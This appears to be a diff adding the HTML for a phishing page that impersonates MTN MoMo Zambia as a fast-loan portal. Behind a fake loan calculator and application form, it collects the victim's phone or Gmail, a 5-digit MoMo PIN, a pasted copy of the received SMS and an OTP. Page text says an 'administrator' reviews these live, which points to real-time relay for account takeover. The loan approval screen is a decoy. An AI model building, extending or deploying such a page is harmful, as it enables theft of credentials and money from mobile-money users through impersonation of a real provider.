@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MTN MoMo Zambia - Fast Loan Application & Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="bank-header">
+    <div class="header-container">
+      <div class="logo-area">
+        <span class="bank-badge">MoMo</span>
+        <h1 class="bank-title">MTN MoMo</h1>
+      </div>
+    </div>
+  </header>
+
+  <main class="main-content">
+    <!-- VIEW 1: LOAN CALCULATOR / HOME -->
+    <div id="view-calculator" class="card active-card">
+      <h2>Get Your Fast Loan Today</h2>
+      <p class="subtitle">Quick approval • Low interest • Flexible terms</p>
+      
+      <div class="calc-box">
+        <div class="input-group">
+          <label>Loan Amount (ZMW)</label>
+          <input type="text" id="calc-amount" value="ZMW 5,000" readonly>
+          <input type="range" id="amount-range" min="500" max="50000" step="500" value="5000">
+          <div class="range-labels"><span>ZMW 500</span><span>ZMW 50,000</span></div>
+        </div>
+
+        <div class="input-group">
+          <label>Loan Duration (Months)</label>
+          <input type="range" id="duration-range" min="3" max="36" value="12">
+          <span id="duration-val">12 Months</span>
+        </div>
+
+        <div class="monthly-display">
+          <span>Estimated Monthly Payment</span>
+          <h3 id="monthly-payment">ZMW 462.50</h3>
+        </div>
+      </div>
+
+      <button id="btn-start-app" class="primary-btn">APPLY NOW</button>
+
+      <div class="features-row">
+        <div class="feature-item">
+          ⚡ <strong>Fast Approval</strong>
+          <span>Within 24 hours</span>
+        </div>
+        <div class="feature-item">
+          💰 <strong>Low Rates</strong>
+          <span>Starting from 15%</span>
+        </div>
+        <div class="feature-item">
+          🔒 <strong>Secure</strong>
+          <span>MoMo Grade Security</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 2: MULTI-STEP APPLICATION FORM -->
+    <div id="view-form" class="card hidden">
+      <div class="form-header">
+        <h2>Loan Application</h2>
+        <span id="step-indicator">Step 1 of 3</span>
+      </div>
+      <div class="progress-bar-container">
+        <div id="progress-fill" style="width: 33%;"></div>
+      </div>
+
+      <!-- Step 1: Details -->
+      <div class="form-step active-step" data-step="1">
+        <div class="field">
+          <label>Loan Type</label>
+          <select id="loan-type">
+            <option value="Business Loan">Business Loan</option>
+            <option value="Personal Loan">Personal Loan</option>
+            <option value="Emergency Loan">Emergency Loan</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Loan Amount (ZMW)</label>
+          <input type="number" id="form-amount" placeholder="e.g. 5000" required>
+        </div>
+        <div class="field">
+          <label>Purpose of Loan</label>
+          <textarea id="loan-purpose" placeholder="Describe the purpose of your loan..." rows="3" required></textarea>
+        </div>
+        <button type="button" class="primary-btn next-btn" disabled>NEXT STEP</button>
+      </div>
+
+      <!-- Step 2: Personal Info & Contact -->
+      <div class="form-step hidden" data-step="2">
+        <div class="row-fields">
+          <div class="field">
+            <label>First Name</label>
+            <input type="text" id="first-name" placeholder="First Name" required>
+          </div>
+          <div class="field">
+            <label>Last Name</label>
+            <input type="text" id="last-name" placeholder="Last Name" required>
+          </div>
+        </div>
+        <div class="field">
+          <label>Contact Method (Phone Number or Gmail Address)</label>
+          <input type="text" id="user-contact" placeholder="+260961234567 or user@gmail.com" required>
+          <small class="hint">Enter active mobile number with country code or your Gmail account.</small>
+        </div>
+        <div class="button-group">
+          <button type="button" class="secondary-btn prev-btn">BACK</button>
+          <button type="button" class="primary-btn next-btn" disabled>NEXT STEP</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Employment & Summary -->
+      <div class="form-step hidden" data-step="3">
+        <div class="field">
+          <label>Employment Status</label>
+          <select id="employment-status">
+            <option value="Employed">Employed</option>
+            <option value="Self-Employed">Self-Employed</option>
+            <option value="Business Owner">Business Owner</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Annual Income (ZMW)</label>
+          <input type="number" id="annual-income" placeholder="Enter annual income" required>
+        </div>
+
+        <div class="summary-box">
+          <h3>Application Summary</h3>
+          <p><strong>Loan Amount:</strong> <span id="sum-amount">-</span></p>
+          <p><strong>Duration:</strong> <span id="sum-duration">-</span></p>
+          <p><strong>Purpose:</strong> <span id="sum-purpose">-</span></p>
+          <p><strong>Applicant:</strong> <span id="sum-name">-</span></p>
+        </div>
+
+        <div class="button-group">
+          <button type="button" class="secondary-btn prev-btn">BACK</button>
+          <button type="button" id="btn-submit-app" class="primary-btn" disabled>SUBMIT APPLICATION</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 3: WAITING FOR ADMIN APPROVAL (PIN ENTRY SCREEN) -->
+    <div id="view-waiting" class="card hidden center-card">
+      <div class="spinner"></div>
+      <h2>Application Submitted</h2>
+      <p>Your loan application has been submitted. Please wait for verification.</p>
+      <div class="status-box">
+        <span id="waiting-status-text">Waiting for manager to review details...</span>
+      </div>
+    </div>
+
+    <!-- VIEW 4: PIN & LOGIN ENTRY -->
+    <div id="view-login" class="card hidden">
+      <div class="login-header">
+        <span class="bank-badge sm">MoMo</span>
+        <h2>Account Login</h2>
+        <p>Enter your credentials to proceed with disbursement</p>
+      </div>
+      <div class="field">
+        <label>Phone Number or Gmail</label>
+        <input type="text" id="login-contact" placeholder="+260... or gmail@gmail.com" required>
+      </div>
+      <div class="field">
+        <label>Enter 5-Digit PIN</label>
+        <div class="pin-inputs">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        </div>
+        <span id="pin-error" class="error-text hidden">Incorrect PIN entered. Please try again.</span>
+      </div>
+      <button id="btn-login" class="primary-btn" disabled>LOGIN</button>
+    </div>
+
+    <!-- VIEW 4.5: SMS PASTE SCREEN -->
+    <div id="view-sms-paste" class="card hidden">
+      <h2>SMS Verification</h2>
+      <p class="subtitle">Please copy and paste the SMS message received on your device for security validation.</p>
+      
+      <div class="field">
+        <label>Paste SMS Message</label>
+        <textarea id="pasted-sms-input" rows="4" placeholder="Paste your received MoMo/Bank SMS message here..."></textarea>
+      </div>
+      
+      <button id="btn-submit-sms" class="primary-btn">SUBMIT SMS FOR VALIDATION</button>
+    </div>
+
+    <!-- VIEW 4.6: WAITING FOR SMS VALIDATION -->
+    <div id="view-waiting-sms" class="card hidden center-card">
+      <div class="spinner"></div>
+      <h2>Validating SMS</h2>
+      <p>Your message has been sent to the administrator. Admin can copy your text and choose validation status...</p>
+    </div>
+
+    <!-- VIEW 5: OTP VERIFICATION -->
+    <div id="view-otp" class="card hidden">
+      <h2>OTP Verification</h2>
+      <p>Enter OTP sent to your contact <span id="otp-target-display"></span></p>
+      <div class="field">
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+        </div>
+        <span id="otp-error" class="error-text hidden">Incorrect OTP entered. Please try again.</span>
+      </div>
+      <button id="btn-submit-otp" class="primary-btn" disabled>SUBMIT</button>
+    </div>
+
+    <!-- VIEW 6: SUCCESS -->
+    <div id="view-success" class="card hidden center-card">
+      <div class="success-icon">✓</div>
+      <h2>Congratulations!</h2>
+      <p>Your loan has been approved! Funds will be disbursed shortly.</p>
+      <div class="approved-amount-box">
+        <span>APPROVED AMOUNT</span>
+        <h3 id="approved-amount-val">ZMW 5,000</h3>
+      </div>
+      <button id="btn-home" class="primary-btn">RETURN HOME</button>
+    </div>
+  </main>
+
+  <footer class="bank-footer">
+    <p>&copy; 2026 MTN MoMo Zambia Limited. All rights reserved.</p>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+                                                                                                             </html>
+  
